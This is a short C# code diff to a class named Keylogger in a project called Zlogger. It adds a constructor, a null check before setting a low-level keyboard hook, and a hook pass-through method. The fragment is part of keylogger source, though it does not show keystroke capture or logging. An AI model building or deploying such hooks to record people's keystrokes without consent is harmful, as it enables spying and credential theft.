@@ -10,8 +10,8 @@ namespace Rodjenihm.Zlogger
     public sealed class Keylogger : IDisposable
     {
         private readonly LowLevelKeyboardHook hook;
-        public string LogPath { get; set; }
-        public HOOKPROC KeyboardHookProc { get; set; }
+        public string LogPath { get; set; } = string.Empty;
+        public HOOKPROC KeyboardHookProc { get; set; } = null;
 
         public Keylogger()
         {
@@ -23,9 +23,20 @@ namespace Rodjenihm.Zlogger
             LogPath = logPath;
         }
 
+        public Keylogger(string logPath, HOOKPROC keyboardHookProc) : this(logPath)
+        {
+            KeyboardHookProc = keyboardHookProc;
+        }
+
         public void Run()
         {
-            hook.SetHook(KeyboardHookProc);
+            if (KeyboardHookProc != null) hook.SetHook(KeyboardHookProc);
+            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(KeyboardHookProc));
+        }
+
+        public IntPtr NextHook(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            return hook.NextHook(nCode, wParam, lParam);
         }
 
         public void Dispose()
